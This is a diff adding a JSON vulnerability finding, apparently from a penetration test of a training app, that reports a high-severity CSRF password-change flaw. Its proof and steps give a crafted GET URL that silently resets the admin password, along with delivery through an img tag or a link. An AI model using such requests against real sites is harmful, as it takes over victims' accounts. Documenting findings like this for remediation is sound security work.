@@ -1,0 +1,11 @@
+{
+  "title": "Cross-Site Request Forgery (CSRF) - Password Change",
+  "severity": "High",
+  "location": "/vulnerabilities/csrf/",
+  "proof": "GET /vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change successfully changed the admin password to 'hacked123' without any CSRF token or anti-CSRF mechanism. The form uses GET method and has no token validation. Successfully re-authenticated with new password, then restored original.",
+  "poc_steps": [
+    "Craft URL: http://target/vulnerabilities/csrf/?password_new=attacker&password_conf=attacker&Change=Change",
+    "Victim visits this URL (e.g., via <img> tag or malicious link)",
+    "Admin password is silently changed"
+  ]
+}
